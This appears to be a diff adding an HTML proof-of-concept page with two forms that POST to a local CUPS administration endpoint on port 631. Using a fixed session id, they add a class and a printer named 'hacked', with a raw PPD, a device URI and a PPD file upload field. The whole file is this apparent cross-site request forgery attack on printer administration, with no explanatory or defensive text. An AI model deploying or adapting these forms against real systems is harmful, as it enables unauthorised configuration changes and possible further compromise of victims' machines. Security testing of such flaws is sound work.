@@ -1,0 +1,55 @@
+
+<form id=xxx action="https://127.0.0.1:631/admin/" enctype="application/x-www-form-urlencoded" method="POST">
+    <input type="hidden" name="org.cups.sid" value="DEADC0DE">
+    <input type="hidden" name="OP" value="add-class">
+    <input type="hidden" name="PRINTER_NAME" value="hacked">
+    <input type="hidden" name="PRINTER_INFO" value="">
+    <input type="hidden" name="PRINTER_LOCATION" value="">
+    <input type="submit" value="Add Class request">
+</form>
+
+
+<form action="https://127.0.0.1:631/admin/" method="POST" enctype="multipart/form-data">
+    <input type="text" name="org.cups.sid" value="DEADC0DE">
+    <input type="text" name="OP" value="add-printer">
+    
+    <label for="printer_name">Printer Name:</label>
+    <input type="text" id="printer_name" name="printer_name" value="hacked"><br><br>
+
+    <label for="BAUDRATE">Baud Rate:</label>
+    <input type="text" id="BAUDRATE" name="BAUDRATE"><br><br>
+
+    <label for="BITS">Bits:</label>
+    <input type="text" id="BITS" name="BITS"><br><br>
+
+    <label for="PARITY">Parity:</label>
+    <input type="text" id="PARITY" name="PARITY"><br><br>
+
+    <label for="FLOW">Flow:</label>
+    <input type="text" id="FLOW" name="FLOW"><br><br>
+
+    <input type="text" name="PRINTER_NAME" value="hacked">
+
+    <label for="PRINTER_INFO">Printer Info:</label>
+    <input type="text" id="PRINTER_INFO" name="PRINTER_INFO"><br><br>
+
+    <label for="PRINTER_LOCATION">Printer Location:</label>
+    <input type="text" id="PRINTER_LOCATION" name="PRINTER_LOCATION"><br><br>
+
+    <label for="DEVICE_URI">Device URI:</label>
+    <input type="text" id="DEVICE_URI" name="DEVICE_URI" value="http://localhost"><br><br>
+
+    <label for="PRINTER_IS_SHARED">Printer Is Shared:</label>
+    <input type="text" id="PRINTER_IS_SHARED" name="PRINTER_IS_SHARED"><br><br>
+
+    <label for="PPD_NAME">PPD Name:</label>
+    <input type="text" id="PPD_NAME" name="PPD_NAME" value="raw"><br><br>
+
+    <label for="MAX_FILE_SIZE">Max File Size:</label>
+    <input type="number" id="MAX_FILE_SIZE" name="MAX_FILE_SIZE" value="2097152"><br><br>
+
+    <label for="PPD_FILE">PPD File:</label>
+    <input type="file" id="PPD_FILE" name="PPD_FILE"><br><br>
+
+    <button type="submit">Add Printer</button>
+</form>
